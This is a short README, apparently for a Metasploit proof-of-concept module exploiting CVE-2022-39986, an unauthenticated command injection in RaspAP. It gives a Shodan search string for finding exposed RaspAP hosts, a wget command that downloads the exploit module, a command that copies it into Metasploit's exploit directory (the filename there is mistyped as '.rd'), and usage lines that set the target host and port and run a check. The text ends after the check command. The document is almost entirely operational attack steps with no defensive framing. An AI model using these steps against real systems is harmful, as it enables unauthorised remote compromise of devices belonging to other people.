# 2022-39986
RaspAP Unauthenticated Command Injection

- Shodan dork:
```
"RaspAP"
```

### Install
```
wget https://github.com/getdrive/PoC/2022/RaspAP_RCE/raspap_rce.rb
```
```
cp  raspap_rce.rd /usr/share/metasploit-framework/modules/exploit/unix/http/
```
### Usage
```
use exploit/unix/http/raspap_rce
```
```
set RHOST [IP]
set RPORT [PORT]
check